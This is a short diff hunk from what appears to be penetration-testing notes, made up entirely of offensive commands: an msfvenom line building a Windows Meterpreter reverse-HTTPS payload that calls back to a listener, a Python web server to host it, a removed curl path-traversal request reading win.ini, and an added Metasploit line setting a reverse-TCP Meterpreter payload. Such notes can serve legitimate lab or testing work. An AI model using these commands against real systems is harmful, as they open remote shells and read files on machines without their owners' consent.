@@ -6,5 +6,5 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-curl http://192.168.1.84:5357/../../../../windows/win.ini
+set PAYLOAD windows/meterpreter/reverse_tcp
 
